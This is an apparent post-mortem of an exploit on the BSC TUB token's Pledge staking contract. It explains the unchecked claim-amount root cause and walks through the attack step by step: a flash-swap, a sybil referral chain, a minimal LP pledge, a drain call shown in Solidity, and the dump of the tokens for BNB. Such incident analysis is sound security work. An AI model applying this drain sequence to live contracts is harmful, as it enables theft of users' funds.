# TUB-27k-PoC

**Chain:** BSC
**Attack TX:** [`0xec7210249bff818f98962d7eec55030675c4cec8a0d9b3647954a633ead35e5d`](https://bscscan.com/tx/0xec7210249bff818f98962d7eec55030675c4cec8a0d9b3647954a633ead35e5d)
**Loss:** ~45.097 BNB

>| Contract | Address | Role |
>|---|---|---|
>| TUB Token | `0x2b9A66237682AcEed60edabF21395fa213ba637B` | ERC-20 with 7% transfer tax and parent-chain referral system |
>| Pledge (vulnerable) | `0xfa096c469E00303AeA79A3ce8FA5e7F1a977A470` | LP staking / reward distribution contract |
>| TUB/WBNB Pair | `0x75221e44084784b6d05004f07A81BdE04132BAD8` | PancakeSwap V2 liquidity pair |
>| WBNB | `0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c` | Wrapped BNB |
>| Flash-swap Source | `0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE` | USDT/WBNB PancakeSwap pair (1,000 wei borrow) |
>| Exploit Contract | `0xb4032DFf6DFA3c00E8B7C234d2FF6817e5B214B4` | Deployed atomically in the attack tx |
>| 5 Minion Contracts | `0xb6b9…`, `0x91a0…`, `0x14ED…`, `0xa67B…`, `0x4d0c…` | Sybil wallets for parent-chain amplification |

---

## Summary

Attacker drained the entire TUB reward balance from the Pledge contract (`0xfa096c`) in a single atomic transaction, the exploit leveraged an **unchecked user-supplied amount parameter** in the reward claim function (`selector 0xb45c9928`), combined with a **sybil referral chain** constructed via TUB parent-tracking transfer mechanism, to extract ~8.73 × 10²⁷ TUB tokens from the reward pool, the stolen tokens were immediately dumped into the TUB/WBNB PancakeSwap pair, collapsing the price by over 99.99% and extracting ~45.097 BNB of real value.

No external funding was required, the entire attack was bootstrapped from a 1,000-wei WBNB flashswap, essentially zero capital

---

## TUB Token Mechanics

TUB is not a standard ERC-20, two features are critical to understanding this exploit

## Transfer Tax (7%)

Every TUB `transfer()` deducts 7% from the sender on top of the transferred amount

- **2%** to the sender first level parent (referrer)
- **1%** to the sender second level parent
- **2%** to a fee collector address (`0x08d7c1`)
- **1%** to a marketing wallet (`0xadd93A`)
- **1%** to a second marketing wallet (`0xadd93A`)

recipient receives the full transfer amount, the sender is debited `amount × 107/100`

## Parent chain

On every transfer, TUB records the sender as the recipient "parent":
```
parent[recipient] = sender
```

this creates a referral ancestry chain, the function `getParentAddress(address)` returns the recorded parent for any address, this parent chain is used by the Pledge contract to distribute rewards up the referral tree.

**Critical weakness:** Parent registration requires nothing more than a token transfer, any address can become anyone else parent simply by sending them tokens.

---

## Root Cause

Pledge contract exposes a non-view function at selector `0xb45c9928` with signature

```
b45c9928(uint256 amount, uint256 bound, bytes data)
```

When called, this function

1. Transfers `amount` TUB from the Pledge contract balance to the caller
2. Walks the caller parent chain via `getParentAddress()`
3. At each level, transfers a decreasing fraction of `amount` to the parent
4. Repeats for up to 5 ancestor levels

**`amount` parameter is entirely user-supplied** function does not

- Check that `amount` corresponds to any earned, accrued, or owed reward
- Verify the caller staking duration, LP position size, or reward entitlement
- Compare `amount` against any internal accounting ledger
- Rate-limit or cap the claim per address or per block

only prerequisite is having previously called `pledge()` with at least 1 LP token, after that, any value of `amount` up to the contract TUB balance is accepted.

this is equivalent to a withdrawal function where the user tells the bank how much money they have.

---

## Exec Flow

entire exploit executes in a single transaction within a constructor + flash-swap callback

// 1 — Bootstrap

```
Attacker EOA → CREATE wrapper → CREATE exploit contract → exploit.run()
```

`run()` initiates a flash-swap of **1,000 wei WBNB** (~$0.0000000006) from the USDT/WBNB pair, the borrow amount is irrelevant, the flash-swap is used purely as an execution framework to bundle everything atomically.

// 2 — Seed TUB Purchase

Inside the `pancakeCall` callback

```
10 wei WBNB → TUB/WBNB pair.swap() → ~31,084,612 wei TUB
```

cost: 10 wei WBNB, this buys enough TUB to seed the parent chain and mint LP

// 3 — Sybil Parent Chain Construction

five identical "Minion" contracts are deployed via `CREATE`, then TUB is forwarded through a chain

```
exploit → minion[0] → minion[1] → minion[2] → minion[3] → minion[4] → exploit
```

each `transfer` triggers TUB parent registration

```
parent[minion[0]] = exploit
parent[minion[1]] = minion[0]
parent[minion[2]] = minion[1]
parent[minion[3]] = minion[2]
parent[minion[4]] = minion[3]
parent[exploit]   = minion[4]    ← final transfer closes the loop
```

after this phase, when the Pledge contract walks the exploit contract parent chain, it will traverse all 5 minions, each controlled by the attacker

// 4 — Minimum Viable Pledge

```
1. Transfer 10,000 TUB + 1 wei WBNB to TUB/WBNB pair
2. pair.mint(exploit) → 5 LP tokens
3. LP.approve(pledge, 5)
4. pledge.pledge(1) → transfers 1 LP to pledge contract
```

Only **1 LP token** (worth effectively zero) is staked, this is the minimum required to pass the eligibility check in `b45c9928`.

// 5 — The Drain

```solidity
pledge.call(abi.encodeWithSelector(
    0xb45c9928,
    4_767_323_914_673_166_914_307_715_459,  // ~4.77 × 10²⁷
    type(uint256).max,
    ""
));
```

Pledge contract executes

| Recipient | Amount (TUB) | Relationship |
|---|---|---|
| exploit | 4.767 × 10²⁷ | Caller (claimer) |
| minion[4] | 1.430 × 10²⁷ | Parent (level 1) |
| minion[3] | 1.001 × 10²⁷ | Grandparent (level 2) |
| minion[2] | 7.007 × 10²⁶ | Level 3 |
| minion[1] | 4.905 × 10²⁶ | Level 4 |
| minion[0] | 3.433 × 10²⁶ | Level 5 |
| **Total** | **~8.73 × 10²⁷** | **100% of pledge's TUB** |

parent payouts follow a ~0.7× decay factor per level, with 5 sybil ancestors, the attacker captures roughly **1.83×** the base claim amount

// 6 — dump for WBNB

exploit contract and all 5 minions sequentially sell their TUB into the TUB/WBNB pair

```
Pass 1: exploit sells 4.45e27 TUB → 44.4 BNB (93% of total profit)
         minion[4] sells → 0.34 BNB
         minion[3] sells → 0.16 BNB
         minion[2] sells → 0.08 BNB
         minion[1] sells → 0.05 BNB
         minion[0] sells → 0.03 BNB

Pass 2-3: residual TUB from transfer-tax redistributions → dust
```

Each subsequent sale gets exponentially worse returns due to the pair reserves becoming increasingly imbalanced

// 7 — Repay

```
1. WBNB.transfer(flash_pair, 1003)          // repay 1000 + 0.3% fee
2. WBNB.withdraw(45,097,403,792,450,239,246) // unwrap to BNB
3. exploit → wrapper → attacker EOA          // forward ~45.097 BNB
```

---
